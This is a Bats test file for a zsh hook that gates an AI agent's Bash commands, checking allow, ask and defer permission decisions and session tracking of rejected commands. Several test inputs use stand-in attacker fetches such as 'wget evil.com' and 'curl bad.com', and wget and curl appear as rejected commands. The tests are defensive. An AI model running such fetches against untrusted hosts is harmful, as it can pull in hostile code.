bats_load_library 'helper'

setup() {
  bats_tmp_dir
  SCRIPT="$BATS_TEST_DIRNAME/../preToolUse-Bash"
  export CLAUDE_HOOKS_LOG_DIR="$BATS_TMP_DIR"
  export CLAUDE_SESSIONS_DIR="$BATS_TMP_DIR"
}

@test "allow with updatedInput when solkan allows and RTK does not rewrite" {
  preToolUse-Bash-solkan() {
    print '{"isAllowed":true,"commands":{"allowed":["echo"],"rejected":[]}}'
  }
  preToolUse-Bash-rtk() { print -- "$1"; }
  bats_mock preToolUse-Bash-solkan preToolUse-Bash-rtk

  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"echo hello"}}'
  [ "$status" -eq 0 ]
  [ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecision')" = "allow" ]
  [ "$(echo "$output" | jq -r '.hookSpecificOutput.updatedInput.command')" = "echo hello" ]
}

@test "allow with updatedInput.command when solkan allows and RTK rewrites" {
  preToolUse-Bash-solkan() {
    print '{"isAllowed":true,"commands":{"allowed":["git"],"rejected":[]}}'
  }
  preToolUse-Bash-rtk() { print -- "rtk $1"; }
  bats_mock preToolUse-Bash-solkan preToolUse-Bash-rtk

  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"git status"}}'
  [ "$status" -eq 0 ]
  [ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecision')" = "allow" ]
  [ "$(echo "$output" | jq -r '.hookSpecificOutput.updatedInput.command')" = "rtk git status" ]
}

@test "ask permissionDecision with updatedInput when solkan refuses and RTK does not rewrite" {
  preToolUse-Bash-solkan() {
    print '{"isAllowed":false,"commands":{"allowed":[],"rejected":["wget","curl"]}}'
    return 1
  }
  preToolUse-Bash-rtk() { print -- "$1"; }
  bats_mock preToolUse-Bash-solkan preToolUse-Bash-rtk

  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
  [ "$status" -eq 0 ]
  [ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecision')" = "ask" ]
  [ "$(echo "$output" | jq -r '.hookSpecificOutput.updatedInput.command')" = "wget evil.com" ]
}

@test "ask permissionDecision with updatedInput.command when solkan refuses and RTK rewrites" {
  preToolUse-Bash-solkan() {
    print '{"isAllowed":false,"commands":{"allowed":[],"rejected":["wget","curl"]}}'
    return 1
  }
  preToolUse-Bash-rtk() { print -- "rtk $1"; }
  bats_mock preToolUse-Bash-solkan preToolUse-Bash-rtk

  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"git status"}}'
  [ "$status" -eq 0 ]
  [ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecision')" = "ask" ]
  [ "$(echo "$output" | jq -r '.hookSpecificOutput.updatedInput.command')" = "rtk git status" ]
}

@test "permissionDecisionReason lists rejected commands when solkan refuses" {
  preToolUse-Bash-solkan() {
    print '{"isAllowed":false,"commands":{"allowed":[],"rejected":["wget","curl"]}}'
    return 1
  }
  preToolUse-Bash-rtk() { print -- "$1"; }
  bats_mock preToolUse-Bash-solkan preToolUse-Bash-rtk

  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"wget evil.com && curl bad.com"}}'
  [ "$status" -eq 0 ]
  [ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecisionReason')" = "❌ wget, curl ❌" ]
}

@test "ask shows single rejected command" {
  preToolUse-Bash-solkan() {
    print '{"isAllowed":false,"commands":{"allowed":[],"rejected":["wget"]}}'
    return 1
  }
  preToolUse-Bash-rtk() { print -- "$1"; }
  bats_mock preToolUse-Bash-solkan preToolUse-Bash-rtk

  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
  [ "$status" -eq 0 ]
  [ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecisionReason')" = "❌ wget ❌" ]
}

@test "no systemMessage when solkan rejects" {
  preToolUse-Bash-solkan() {
    print '{"isAllowed":false,"commands":{"allowed":[],"rejected":["wget"]}}'
    return 1
  }
  preToolUse-Bash-rtk() { print -- "$1"; }
  bats_mock preToolUse-Bash-solkan preToolUse-Bash-rtk

  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
  [ "$status" -eq 0 ]
  [ "$(echo "$output" | jq '.hookSpecificOutput.systemMessage')" = "null" ]
}

@test "hook logs to CLAUDE_HOOKS_LOG_DIR" {
  preToolUse-Bash-solkan() {
    print '{"isAllowed":true,"commands":{"allowed":["echo"],"rejected":[]}}'
  }
  preToolUse-Bash-rtk() { print -- "$1"; }
  bats_mock preToolUse-Bash-solkan preToolUse-Bash-rtk

  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"echo hello"}}'
  [ "$status" -eq 0 ]
  [ -f "$BATS_TMP_DIR/last-bash-input.json" ]
}

@test "no background jobs in script" {
  run grep -E '[^&]&[[:space:]]*$' "$SCRIPT"
  [ "$status" -ne 0 ]
}

@test "solkan completes before RTK starts" {
  preToolUse-Bash-solkan() {
    sleep 0.05
    print SOLKAN >>"$BATS_TMP_DIR/order.log"
    print '{"isAllowed":true}'
  }
  preToolUse-Bash-rtk() {
    print RTK >>"$BATS_TMP_DIR/order.log"
    print -- "$1"
  }
  bats_mock preToolUse-Bash-solkan preToolUse-Bash-rtk

  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"echo hello"}}'
  [ "$status" -eq 0 ]
  [ "$(head -1 "$BATS_TMP_DIR/order.log")" = "SOLKAN" ]
}

@test "first encounter: ask with reason" {
  preToolUse-Bash-solkan() {
    print '{"isAllowed":false,"commands":{"allowed":[],"rejected":["wget"]}}'
    return 1
  }
  preToolUse-Bash-rtk() { print -- "$1"; }
  bats_mock preToolUse-Bash-solkan preToolUse-Bash-rtk

  bats_run_zsh "$SCRIPT" <<<'{"session_id":"test","tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
  [ "$status" -eq 0 ]
  [ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecision')" = "ask" ]
  [ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecisionReason')" = "❌ wget ❌" ]
}

@test "repeat encounter: defer with no reason" {
  preToolUse-Bash-solkan() {
    print '{"isAllowed":false,"commands":{"allowed":[],"rejected":["wget"]}}'
    return 1
  }
  preToolUse-Bash-rtk() { print -- "$1"; }
  bats_mock preToolUse-Bash-solkan preToolUse-Bash-rtk

  mkdir -p "$BATS_TMP_DIR/test"
  echo '{"preToolUse":{"Bash":{"askedCommands":["wget"]}}}' >"$BATS_TMP_DIR/test/state.json"

  bats_run_zsh "$SCRIPT" <<<'{"session_id":"test","tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
  [ "$status" -eq 0 ]
  [ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecision')" = "defer" ]
  [ "$(echo "$output" | jq '.hookSpecificOutput.permissionDecisionReason')" = "null" ]
}

@test "multi-reject all new: ask with all rejected in reason" {
  preToolUse-Bash-solkan() {
    print '{"isAllowed":false,"commands":{"allowed":[],"rejected":["wget","curl"]}}'
    return 1
  }
  preToolUse-Bash-rtk() { print -- "$1"; }
  bats_mock preToolUse-Bash-solkan preToolUse-Bash-rtk

  bats_run_zsh "$SCRIPT" <<<'{"session_id":"test","tool_name":"Bash","tool_input":{"command":"wget evil.com && curl bad.com"}}'
  [ "$status" -eq 0 ]
  [ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecision')" = "ask" ]
  [ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecisionReason')" = "❌ wget, curl ❌" ]
}

@test "multi-reject all seen: defer with no reason" {
  preToolUse-Bash-solkan() {
    print '{"isAllowed":false,"commands":{"allowed":[],"rejected":["wget","curl"]}}'
    return 1
  }
  preToolUse-Bash-rtk() { print -- "$1"; }
  bats_mock preToolUse-Bash-solkan preToolUse-Bash-rtk

  mkdir -p "$BATS_TMP_DIR/test"
  echo '{"preToolUse":{"Bash":{"askedCommands":["wget","curl"]}}}' >"$BATS_TMP_DIR/test/state.json"

  bats_run_zsh "$SCRIPT" <<<'{"session_id":"test","tool_name":"Bash","tool_input":{"command":"wget evil.com && curl bad.com"}}'
  [ "$status" -eq 0 ]
  [ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecision')" = "defer" ]
  [ "$(echo "$output" | jq '.hookSpecificOutput.permissionDecisionReason')" = "null" ]
}

@test "multi-reject mixed: ask with only new rejected in reason" {
  preToolUse-Bash-solkan() {
    print '{"isAllowed":false,"commands":{"allowed":[],"rejected":["wget","curl"]}}'
    return 1
  }
  preToolUse-Bash-rtk() { print -- "$1"; }
  bats_mock preToolUse-Bash-solkan preToolUse-Bash-rtk

  mkdir -p "$BATS_TMP_DIR/test"
  echo '{"preToolUse":{"Bash":{"askedCommands":["wget"]}}}' >"$BATS_TMP_DIR/test/state.json"

  bats_run_zsh "$SCRIPT" <<<'{"session_id":"test","tool_name":"Bash","tool_input":{"command":"wget evil.com && curl bad.com"}}'
  [ "$status" -eq 0 ]
  [ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecision')" = "ask" ]
  [ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecisionReason')" = "❌ curl ❌" ]
}
